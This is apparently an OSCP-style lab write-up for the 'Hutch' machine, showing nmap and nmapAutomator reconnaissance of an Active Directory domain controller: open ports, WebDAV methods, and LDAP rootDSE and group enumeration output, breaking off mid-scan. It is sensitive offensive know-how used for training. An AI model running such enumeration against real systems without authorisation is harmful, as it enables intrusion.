## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ ~/tools/nmapAutomator/nmapAutomator.sh -H 192.168.171.122 -t Full

Running a Full scan on 192.168.171.122

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49687/tcp open  unknown
49782/tcp open  unknown



Making a script scan on all ports



PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan:
|   Server Date: Thu, 31 Aug 2023 14:00:15 GMT
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-31 13:59:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49782/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-08-31T14:00:17
|_  start_date: N/A




---------------------Finished all scans------------------------


Completed in 12 minute(s) and 32 second(s)
```

nmap 繼續查 ldap 

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Hutch]
└─$ nmap -n -sV --script "ldap* and not brute" 192.168.171.122
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-31 22:20 CST
Nmap scan report for 192.168.171.122
Host is up (0.26s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-31 14:21:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=hutch,DC=offsec
|       ldapServiceName: hutch.offsec:hutchdc$@HUTCH.OFFSEC
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       serverName: CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: DC=hutch,DC=offsec
|       namingContexts: CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: DC=DomainDnsZones,DC=hutch,DC=offsec
|       namingContexts: DC=ForestDnsZones,DC=hutch,DC=offsec
|       isSynchronized: TRUE
|       highestCommittedUSN: 81983
|       dsServiceName: CN=NTDS Settings,CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
|       dnsHostName: hutchdc.hutch.offsec
|       defaultNamingContext: DC=hutch,DC=offsec
|       currentTime: 20230831142151.0Z
|_      configurationNamingContext: CN=Configuration,DC=hutch,DC=offsec
| ldap-search:
|   Context: DC=hutch,DC=offsec
|     dn: DC=hutch,DC=offsec
|     dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Guest
|         description: Built-in account for guest access to the computer/domain
|         distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:25:40 UTC
|         whenChanged: 2020/11/04 05:25:40 UTC
|         uSNCreated: 8197
|         memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 8197
|         name: Guest
|         objectGUID: 044ab54-390-f248-bc3c-a441b3bc47f8
|         userAccountControl: 66082
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 514
|         objectSid: 1-5-21-2216925765-458455009-2806096489-501
|         accountExpires: 30828-09-13T17:57:29+00:00
|         logonCount: 0
|         sAMAccountName: Guest
|         sAMAccountType: 805306368
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Computers
|         description: All workstations and servers joined to the domain
|         distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12330
|         uSNChanged: 12332
|         name: Domain Computers
|         objectGUID: bf57e04a-cee1-fd4a-b485-2f62b5d85cee
|         objectSid: 1-5-21-2216925765-458455009-2806096489-515
|         sAMAccountName: Domain Computers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Cert Publishers
|         description: Members of this group are permitted to publish certificates to the directory
|         distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12342
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         uSNChanged: 12344
|         name: Cert Publishers
|         objectGUID: df7594ea-e87f-bf40-8148-c9d1a63ca68c
|         objectSid: 1-5-21-2216925765-458455009-2806096489-517
|         sAMAccountName: Cert Publishers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Users
|         description: All domain users
|         distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12348
|         memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 12350
|         name: Domain Users
|         objectGUID: 2803cd3-fced-d543-8a4-a6dfd0de8541
|         objectSid: 1-5-21-2216925765-458455009-2806096489-513
|         sAMAccountName: Domain Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Guests
|         description: All domain guests
|         distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12351
|         memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 12353
|         name: Domain Guests
|         objectGUID: ba7583f0-90f-94a-8525-51adcc21367b
|         objectSid: 1-5-21-2216925765-458455009-2806096489-514
|         sAMAccountName: Domain Guests
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Group Policy Creator Owners
|         description: Members in this group can modify group policy for the domain
|         member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
|         distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12354
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         uSNChanged: 12391
|         name: Group Policy Creator Owners
|         objectGUID: 20f62f8-c24-a64f-9191-289c1149958
|         objectSid: 1-5-21-2216925765-458455009-2806096489-520
|         sAMAccountName: Group Policy Creator Owners
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: RAS and IAS Servers
|         description: Servers in this group can access remote access properties of users
|         distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12357
|         uSNChanged: 12359
|         name: RAS and IAS Servers
|         objectGUID: 76c688f-de10-7e4d-8cd1-7327f0532256
|         objectSid: 1-5-21-2216925765-458455009-2806096489-553
|         sAMAccountName: RAS and IAS Servers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 71f24ae4-97-a34d-a932-d7fc7124d21
|         objectSid: 1-5-21-2216925765-458455009-2806096489-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
|         member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
|         member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
|         member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 1e2a4623-2fb7-e14f-b2ac-f2b2f232fb60
|         objectSid: 1-5-21-2216925765-458455009-2806096489-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers
|         objectGUID: 42844bc6-c387-f947-a4be-989c3580f2ab
|         objectSid: 1-5-21-2216925765-458455009-2806096489-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Cloneable Domain Controllers
|         description: Members of this group that are domain controllers may be cloned.
|         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12440
|         uSNChanged: 12442
|         name: Cloneable Domain Controllers
|         objectGUID: 178be320-6cb-1d4f-acce-7f87d6419286
|         objectSid: 1-5-21-2216925765-458455009-2806096489-522
|         sAMAccountName: Cloneable Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Protected Users
|         description: Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
|         distinguishedName: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12445
|         uSNChanged: 12447
|         name: Protected Users
|         objectGUID: 9f5e98-fe2c-3b4a-bf7e-c0d7c791ce86
|         objectSid: 1-5-21-2216925765-458455009-2806096489-525
|         sAMAccountName: Protected Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|
|
|_Result limited to 20 objects (see ldap.maxobjects)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=hutch,DC=offsec
|       ldapServiceName: hutch.offsec:hutchdc$@HUTCH.OFFSEC
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       serverName: CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: DC=hutch,DC=offsec
|       namingContexts: CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|       namingContexts: DC=DomainDnsZones,DC=hutch,DC=offsec
|       namingContexts: DC=ForestDnsZones,DC=hutch,DC=offsec
|       isSynchronized: TRUE
|       highestCommittedUSN: 81983
|       dsServiceName: CN=NTDS Settings,CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
|       dnsHostName: hutchdc.hutch.offsec
|       defaultNamingContext: DC=hutch,DC=offsec
|       currentTime: 20230831142151.0Z
|_      configurationNamingContext: CN=Configuration,DC=hutch,DC=offsec
| ldap-search:
|   Context: DC=hutch,DC=offsec
|     dn: DC=hutch,DC=offsec
|     dn: CN=Configuration,DC=hutch,DC=offsec
|     dn: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|     dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Guest
|         description: Built-in account for guest access to the computer/domain
|         distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:25:40 UTC
|         whenChanged: 2020/11/04 05:25:40 UTC
|         uSNCreated: 8197
|         memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
|         uSNChanged: 8197
|         name: Guest
|         objectGUID: 044ab54-390-f248-bc3c-a441b3bc47f8
|         userAccountControl: 66082
|         primaryGroupID: 514
|         objectSid: 1-5-21-2216925765-458455009-2806096489-501
|         sAMAccountName: Guest
|         sAMAccountType: 805306368
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
|         dSCorePropagationData: 2020/11/04 05:35:13 UTC
|         dSCorePropagationData: 2020/11/04 05:26:23 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
|     dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
|         objectClass: top
|         objectClass: group
|         cn: Domain Computers
|         description: All workstations and servers joined to the domain
|         distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
|         instanceType: 4
|         whenCreated: 2020/11/04 05:26:23 UTC
|         whenChanged: 2020/11/04 05:26:23 UTC
|         uSNCreated: 12330
|         uSNChanged: 12332
|         name: Domain Computers
|         objectGUID: bf57e04a-cee1-fd4a-b485-2f62b5d85cee
|         objectSid: 1-5-21-2216925765-458455009-2806096489-515
|         sAMAccountName: Domain Computers
|         sAMAccountType: 268435456
